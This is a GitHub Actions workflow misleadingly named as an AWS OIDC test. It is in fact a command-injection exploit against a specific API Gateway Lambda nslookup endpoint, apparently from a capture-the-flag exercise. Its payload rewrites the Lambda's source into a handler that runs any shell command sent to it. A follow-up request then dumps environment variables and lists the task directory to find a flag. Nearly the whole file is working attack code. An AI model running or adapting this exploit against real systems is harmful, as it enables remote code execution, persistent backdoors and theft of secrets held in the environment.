name: AWS OIDC test for school standart old code procedure

on:
  push:
    branches:
      - corgi

permissions:
  id-token: write
  contents: read

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: Configure AWS Credentials
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::009661764077:role/cicdRole
          aws-region: us-east-1

      - name: Invoke Vulnerable Lambda
        run: |
          API_ID="3q931syi7b"
          REGION="us-east-1"
          URL="https://${API_ID}.execute-api.${REGION}.amazonaws.com/dev/nslookup"
          
          # This payload uses command injection to overwrite lambda_function.py 
          # so that ANY command we pass in 'domain' gets executed AND returned in the website response!
          PAYLOAD='{"domain": "127.0.0.1; echo '\''import json, subprocess'\'' > /var/task/lambda_function.py; echo '\''def lambda_handler(e, c):'\'' >> /var/task/lambda_function.py; echo '\''    cmd = e.get(\"domain\", \"id\")'\'' >> /var/task/lambda_function.py; echo '\''    res = subprocess.run(cmd, shell=True, capture_output=True, text=True)'\'' >> /var/task/lambda_function.py; echo '\''    return {\"statusCode\": 200, \"body\": res.stdout}'\'' >> /var/task/lambda_function.py"}'
          
          echo "=== 1. OVERWRITING LAMBDA CODE VIA INJECTION ==="
          curl -s -X POST "$URL" \
            -H "Content-Type: application/json" \
            -d "$PAYLOAD"
          
          echo ""
          echo "=== 2. REQUESTING THE FLAG ==="
          # Now that the code is rewritten, let's ask it to run 'env' or find the flag file!
          FLAG_PAYLOAD='{"domain": "env && ls -la /var/task"}'
          
          curl -s -X POST "$URL" \
            -H "Content-Type: application/json" \
            -d "$FLAG_PAYLOAD"
